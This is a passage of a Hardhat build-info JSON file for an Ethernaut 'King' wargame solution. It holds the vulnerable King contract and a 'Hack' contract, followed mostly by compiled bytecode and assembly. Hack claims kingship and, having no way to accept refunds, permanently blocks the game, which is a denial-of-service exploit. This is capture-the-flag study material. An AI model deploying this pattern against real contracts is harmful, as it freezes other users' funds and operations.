{
	"id": "1966ada4d784550d9533f22a3bad1d6a",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.17",
	"solcLongVersion": "0.8.17+commit.8df45f5f",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/Ethernaut/09-King.sol": {
				"content": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract King {\r\n\r\n  address king;\r\n  uint public prize;\r\n  address public owner;\r\n\r\n  constructor() payable {\r\n    owner = msg.sender;  \r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  receive() external payable {\r\n    require(msg.value >= prize || msg.sender == owner);\r\n    payable(king).transfer(msg.value);\r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  function _king() public view returns (address) {\r\n    return king;\r\n  }\r\n}\r\n\r\ncontract Hack{\r\n    constructor() payable{\r\n        address king = 0x864E7804E9cd1796f354c67a198d789416d7f996;\r\n        king.call{value: msg.value}(\"\");\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/Ethernaut/09-King.sol": {
				"Hack": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "payable",
							"type": "constructor"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/09-King.sol\":517:679  contract Hack{... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ethernaut/09-King.sol\":569:581  address king */\n  0x00\n    /* \"contracts/Ethernaut/09-King.sol\":584:626  0x864E7804E9cd1796f354c67a198d789416d7f996 */\n  0x864e7804e9cd1796f354c67a198d789416d7f996\n    /* \"contracts/Ethernaut/09-King.sol\":569:626  address king = 0x864E7804E9cd1796f354c67a198d789416d7f996 */\n  swap1\n  pop\n    /* \"contracts/Ethernaut/09-King.sol\":637:641  king */\n  dup1\n    /* \"contracts/Ethernaut/09-King.sol\":637:646  king.call */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/Ethernaut/09-King.sol\":654:663  msg.value */\n  callvalue\n    /* \"contracts/Ethernaut/09-King.sol\":637:668  king.call{value: msg.value}(\"\") */\n  mload(0x40)\n  tag_3\n  swap1\n  tag_4\n  jump\t// in\ntag_3:\n  0x00\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup6\n  dup8\n  gas\n  call\n  swap3\n  pop\n  pop\n  pop\n  returndatasize\n  dup1\n  0x00\n  dup2\n  eq\n  tag_7\n  jumpi\n  mload(0x40)\n  swap2\n  pop\n  and(add(returndatasize, 0x3f), not(0x1f))\n  dup3\n  add\n  0x40\n  mstore\n  returndatasize\n  dup3\n  mstore\n  returndatasize\n  0x00\n  0x20\n  dup5\n  add\n  returndatacopy\n  jump(tag_6)\ntag_7:\n  0x60\n  swap2\n  pop\ntag_6:\n  pop\n  pop\n  pop\n    /* \"contracts/Ethernaut/09-King.sol\":558:676  {... */\n  pop\n    /* \"contracts/Ethernaut/09-King.sol\":517:679  contract Hack{... */\n  jump(tag_8)\n    /* \"#utility.yul\":7:154   */\ntag_9:\n    /* \"#utility.yul\":108:119   */\n  0x00\n    /* \"#utility.yul\":145:148   */\n  dup2\n    /* \"#utility.yul\":130:148   */\n  swap1\n  pop\n    /* \"#utility.yul\":7:154   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":160:274   */\ntag_10:\n  pop\n  jump\t// out\n    /* \"#utility.yul\":280:678   */\ntag_11:\n    /* \"#utility.yul\":439:442   */\n  0x00\n    /* \"#utility.yul\":460:543   */\n  tag_16\n    /* \"#utility.yul\":541:542   */\n  0x00\n    /* \"#utility.yul\":536:539   */\n  dup4\n    /* \"#utility.yul\":460:543   */\n  tag_9\n  jump\t// in\ntag_16:\n    /* \"#utility.yul\":453:543   */\n  swap2\n  pop\n    /* \"#utility.yul\":552:645   */\n  tag_17\n    /* \"#utility.yul\":641:644   */\n  dup3\n    /* \"#utility.yul\":552:645   */\n  tag_10\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":670:671   */\n  0x00\n    /* \"#utility.yul\":665:668   */\n  dup3\n    /* \"#utility.yul\":661:672   */\n  add\n    /* \"#utility.yul\":654:672   */\n  swap1\n  pop\n    /* \"#utility.yul\":280:678   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":684:1063   */\ntag_4:\n    /* \"#utility.yul\":868:871   */\n  0x00\n    /* \"#utility.yul\":890:1037   */\n  tag_19\n    /* \"#utility.yul\":1033:1036   */\n  dup3\n    /* \"#utility.yul\":890:1037   */\n  tag_11\n  jump\t// in\ntag_19:\n    /* \"#utility.yul\":883:1037   */\n  swap2\n  pop\n    /* \"#utility.yul\":1054:1057   */\n  dup2\n    /* \"#utility.yul\":1047:1057   */\n  swap1\n  pop\n    /* \"#utility.yul\":684:1063   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"contracts/Ethernaut/09-King.sol\":517:679  contract Hack{... */\ntag_8:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/09-King.sol\":517:679  contract Hack{... */\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa26469706673582212207334e29c26219d146faf6a2a05995ed7ea74bf2b9e750e3b823c1d275a86db2b64736f6c63430008110033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_87": {
									"entryPoint": null,
									"id": 87,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 149,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 180,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 135,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470": {
									"entryPoint": 146,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1066:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "120:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "130:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "145:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "130:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "92:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "97:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "108:11:1",
														"type": ""
													}
												],
												"src": "7:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "266:8:1",
													"statements": []
												},
												"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "258:6:1",
														"type": ""
													}
												],
												"src": "160:114:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "443:235:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "453:90:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "536:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "541:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "460:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "460:83:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "453:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "641:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"nodeType": "YulIdentifier",
																	"src": "552:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "552:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "552:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "654:18:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "665:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "670:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "661:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "661:11:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "654:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "431:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "439:3:1",
														"type": ""
													}
												],
												"src": "280:398:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "872:191:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "883:154:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1033:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "890:141:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "890:147:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "883:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1047:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1054:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1047:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "859:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "868:3:1",
														"type": ""
													}
												],
												"src": "684:379:1"
											}
										]
									},
									"contents": "{\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "6080604052600073864e7804e9cd1796f354c67a198d789416d7f99690508073ffffffffffffffffffffffffffffffffffffffff1634604051603f9060b4565b60006040518083038185875af1925050503d8060008114607a576040519150601f19603f3d011682016040523d82523d6000602084013e607f565b606091505b5050505060c7565b600081905092915050565b50565b600060a06000836087565b915060a9826092565b600082019050919050565b600060bd826095565b9150819050919050565b603f806100d56000396000f3fe6080604052600080fdfea26469706673582212207334e29c26219d146faf6a2a05995ed7ea74bf2b9e750e3b823c1d275a86db2b64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH20 0x864E7804E9CD1796F354C67A198D789416D7F996 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH1 0x3F SWAP1 PUSH1 0xB4 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH1 0x7A JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH1 0x7F JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP PUSH1 0xC7 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xA0 PUSH1 0x0 DUP4 PUSH1 0x87 JUMP JUMPDEST SWAP2 POP PUSH1 0xA9 DUP3 PUSH1 0x92 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xBD DUP3 PUSH1 0x95 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x3F DUP1 PUSH2 0xD5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH20 0x34E29C26219D146FAF6A2A05995ED7EA74BF2B9E PUSH22 0xE3B823C1D275A86DB2B64736F6C6343000811003300 ",
							"sourceMap": "517:162:0:-:0;;;569:12;584:42;569:57;;637:4;:9;;654;637:31;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;558:118;517:162;;7:147:1;108:11;145:3;130:18;;7:147;;;;:::o;160:114::-;;:::o;280:398::-;439:3;460:83;541:1;536:3;460:83;:::i;:::-;453:90;;552:93;641:3;552:93;:::i;:::-;670:1;665:3;661:11;654:18;;280:398;;;:::o;684:379::-;868:3;890:147;1033:3;890:147;:::i;:::-;883:154;;1054:3;1047:10;;684:379;;;:::o;517:162:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600080fdfea26469706673582212207334e29c26219d146faf6a2a05995ed7ea74bf2b9e750e3b823c1d275a86db2b64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH20 0x34E29C26219D146FAF6A2A05995ED7EA74BF2B9E PUSH22 0xE3B823C1D275A86DB2B64736F6C6343000811003300 ",
							"sourceMap": "517:162:0:-:0;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "12600",
								"executionCost": "infinite",
								"totalCost": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 517,
									"end": 679,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 569,
									"end": 581,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 584,
									"end": 626,
									"name": "PUSH",
									"source": 0,
									"value": "864E7804E9CD1796F354C67A198D789416D7F996"
								},
								{
									"begin": 569,
									"end": 626,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 569,
									"end": 626,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 641,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 637,
									"end": 646,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 637,
									"end": 646,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 654,
									"end": 663,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "4"
								},
								{
									"begin": 637,
									"end": 668,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "tag",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP8",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "GAS",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "CALL",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "EQ",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "3F"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "RETURNDATACOPY",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "tag",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "PUSH",
									"source": 0,
									"value": "60"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 637,
									"end": 668,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 637,
									"end": 668,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 558,
									"end": 676,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 517,
									"end": 679,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 7,
									"end": 154,
									"name": "tag",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 7,
									"end": 154,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 108,
									"end": 119,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 145,
									"end": 148,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 130,
									"end": 148,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 130,
									"end": 148,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 154,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 7,
									"end": 154,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 7,
									"end": 154,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 154,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 154,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 160,
									"end": 274,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 160,
									"end": 274,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 160,
									"end": 274,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 160,
									"end": 274,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 280,
									"end": 678,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 280,
									"end": 678,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 439,
									"end": 442,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 460,
									"end": 543,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 541,
									"end": 542,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 536,
									"end": 539,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 460,
									"end": 543,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 460,
									"end": 543,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 460,
									"end": 543,
									"name": "tag",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 460,
									"end": 543,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 453,
									"end": 543,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 453,
									"end": 543,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 552,
									"end": 645,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 641,
									"end": 644,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 552,
									"end": 645,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 552,
									"end": 645,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 552,
									"end": 645,
									"name": "tag",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 552,
									"end": 645,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 670,
									"end": 671,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 665,
									"end": 668,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 661,
									"end": 672,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 654,
									"end": 672,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 654,
									"end": 672,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 280,
									"end": 678,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 280,
									"end": 678,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 280,
									"end": 678,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 280,
									"end": 678,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 684,
									"end": 1063,
									"name": "tag",
									"source": 1,
									"value": "4"
								},
								{
									"begin": 684,
									"end": 1063,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 868,
									"end": 871,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 890,
									"end": 1037,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 1033,
									"end": 1036,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 890,
									"end": 1037,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 890,
									"end": 1037,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 890,
									"end": 1037,
									"name": "tag",
									"source": 1,
									"value": "19"
								},
								{
									"begin": 890,
									"end": 1037,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 883,
									"end": 1037,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 883,
									"end": 1037,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1054,
									"end": 1057,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1047,
									"end": 1057,
